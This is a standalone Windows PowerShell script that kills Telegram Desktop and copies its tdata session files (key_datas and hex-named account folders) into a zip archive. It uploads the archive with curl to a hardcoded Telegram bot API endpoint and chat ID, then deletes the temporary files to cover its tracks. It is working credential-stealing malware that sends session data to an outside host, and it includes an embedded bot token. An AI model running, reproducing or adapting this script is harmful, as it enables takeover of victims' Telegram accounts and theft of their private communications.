taskkill /f /im Telegram.exe

$tdata = "$env:APPDATA\Telegram Desktop\tdata"
if (!(Test-Path $tdata)) { Write-Host "tdata not found"; exit }

$d = "$env:TMP\t"
New-Item $d -ItemType Directory -Force | Out-Null

$fixed = @(
    "key_datas",
    "countries",
    "prefix",
    "settingss",
    "shortcuts-custom.json",
    "shortcuts-default.json",
    "usertag",
    "working"
)

foreach ($name in $fixed) {
    $src = Join-Path $tdata $name
    if (Test-Path $src) {
        Write-Host "COPY fixed: $name"
        Copy-Item $src $d -Recurse -Force
    } else {
        Write-Host "MISS fixed: $name"
    }
}

Get-ChildItem $tdata -Force | Where-Object {
    $_.Name -match '^[0-9A-Fa-f]{8,32}s?$'
} | ForEach-Object {
    Write-Host "COPY hex: $($_.Name)"
    Copy-Item $_.FullName $d -Recurse -Force
}

$z = "$env:TMP\t.zip"
Compress-Archive "$d\*" $z -Force
Write-Host "ZIP exists: $(Test-Path $z)"
Write-Host "ZIP size: $((Get-Item $z).Length)"

Remove-Item $d -Recurse -Force

curl.exe -F "chat_id=8115479934" -F "document=@$z" "https://api.telegram.org/bot8896140664:AAG3GYY_qygOReI-JTOisou02Lfj3NdavQo/sendDocument"

Remove-Item $z -Force
exit
